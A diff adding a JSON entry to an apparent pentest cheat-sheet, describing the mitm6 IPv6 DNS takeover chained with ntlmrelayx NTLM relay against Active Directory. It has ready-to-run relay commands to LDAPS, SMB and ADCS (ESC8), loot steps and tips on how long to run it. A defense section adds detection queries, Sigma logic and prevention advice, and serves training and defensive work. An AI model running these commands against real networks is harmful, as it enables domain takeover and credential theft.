@@ -1,0 +1,99 @@
+{
+  "id": "ad-mitm6-ipv6-takeover",
+  "name": "mitm6 - IPv6 DNS Takeover + NTLM Relay",
+  "command": "mitm6 -d <domain>",
+  "description": "mitm6 exploits the default IPv6 configuration in Windows to become the primary DNS server via DHCPv6 replies. Combined with ntlmrelayx, it captures NTLM authentication and relays it to LDAP/LDAPS to create machine accounts, set RBCD, or dump credentials.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Fox-IT/mitm6; modern relay attack chain",
+  "tags": [
+    "mitm6",
+    "ipv6",
+    "dhcpv6",
+    "ntlm-relay",
+    "dns-takeover",
+    "wpad",
+    "lateral-movement"
+  ],
+  "mitre": [
+    "T1557.001",
+    "T1557"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE CHAIN ===\n  # Terminal 1: Start mitm6 for DNS takeover\n  mitm6 -d corp.local\n\n  # Terminal 2: Start ntlmrelayx targeting LDAPS\n  ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh wpad.corp.local -l lootdir\n\n=== WHAT HAPPENS ===\n  1. mitm6 sends DHCPv6 replies to all Windows machines\n  2. Victims set attacker as their primary DNS server\n  3. Attacker replies to WPAD/DNS queries, triggering NTLM auth\n  4. ntlmrelayx relays the NTLM hash to LDAPS on the DC\n  5. If a privileged user authenticates: creates computer account + RBCD\n  6. If domain admin: can dump domain info directly\n\n=== NTLM RELAY TARGETS ===\n  # LDAPS (most common - create accounts, set ACLs)\n  ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh wpad.corp.local -l loot\n\n  # SMB (get shells)\n  ntlmrelayx.py -6 -t smb://<target> -wh wpad.corp.local -socks\n\n  # ADCS web enrollment (ESC8)\n  ntlmrelayx.py -6 -t http://<ca>/certsrv/certfnsh.asp -wh wpad.corp.local --adcs --template Machine\n\n=== LOOT ===\n  ls lootdir/   # domain users, groups, computers dumped as HTML\n  # If RBCD set: use getST.py to get admin ticket\n\n=== NOTES ===\n- Works in nearly every AD environment (IPv6 enabled by default)\n- Very loud - spams DHCPv6 to all machines\n- Run for 10-15 minutes, then stop\n- WPAD is the main trigger for NTLM auth",
+  "examples": [
+    {
+      "label": "Full mitm6 + ntlmrelayx chain",
+      "command": "sudo mitm6 -d corp.local"
+    },
+    {
+      "label": "Relay to LDAPS for RBCD",
+      "command": "ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh wpad.corp.local -l lootdir"
+    },
+    {
+      "label": "Relay to ADCS for ESC8",
+      "command": "ntlmrelayx.py -6 -t http://ca01.corp.local/certsrv/certfnsh.asp -wh wpad.corp.local --adcs --template Machine"
+    }
+  ],
+  "references": [
+    {
+      "title": "mitm6 - Fox-IT",
+      "url": "https://github.com/dirkjanm/mitm6"
+    },
+    {
+      "title": "The worst of both worlds - dirkjanm",
+      "url": "https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-petitpotam",
+      "note": "PetitPotam is another authentication coercion method that feeds relay attacks.",
+      "rel": "alternative"
+    },
+    {
+      "id": "smb-ntlm-relay",
+      "note": "ntlmrelayx handles the relay side of the attack.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Windows prefers IPv6 over IPv4 and accepts DHCPv6 replies by default. When the attacker becomes the DNS server, they can reply to WPAD queries to trigger NTLM authentication, which gets relayed to LDAP.",
+    "prerequisites": "IPv6 enabled on target machines (default); LDAP signing not enforced; network access.",
+    "impact": "NTLM hash relay to LDAP for account creation, RBCD, or credential dumping. Can lead to full domain compromise.",
+    "detection": "[MITRE T1557.001] Unusual DHCPv6 traffic; new IPv6 DNS server configuration; WPAD requests to non-standard servers.",
+    "artifacts": "DHCPv6 Solicit/Advertise packets; DNS queries to rogue server; NTLM authentication to DC from unexpected source; Event 4741 (new computer account).",
+    "splunk_spl": "index=network sourcetype=dhcpv6\n| where message_type IN (\"Solicit\",\"Advertise\")\n| stats count by src_ip, dest_ip\n| where count > 50",
+    "elastic_kql": "network.protocol:\"dhcpv6\" AND dhcpv6.message_type:(\"Solicit\" OR \"Advertise\")",
+    "sentinel_kql": "CommonSecurityLog\n| where DeviceEventClassID contains \"DHCPv6\"\n| summarize Count=count() by SourceIP\n| where Count > 50",
+    "sigma_rules": "net_dhcpv6_mitm6_spoofing",
+    "prevention": "Disable DHCPv6 via GPO if not needed; enforce LDAP signing and channel binding; disable WPAD via GPO; enable EPA (Extended Protection for Authentication).",
+    "sources": [
+      "https://github.com/dirkjanm/mitm6",
+      "https://attack.mitre.org/techniques/T1557/001/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "mitm6 DHCPv6 spoofing detection",
+        "logic": "title: Suspicious DHCPv6 Rapid Responses (mitm6)\nstatus: experimental\nlogsource:\n  category: network\n  product: any\ndetection:\n  selection:\n    dst_port: 547\n  condition: selection | count() by src_ip > 50\nlevel: high",
+        "data_source": "network-flow",
+        "attack": [
+          "T1557.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate DHCPv6 servers in dual-stack environments",
+        "tuning": "Whitelist known DHCPv6 server IPs"
+      }
+    ]
+  }
+}
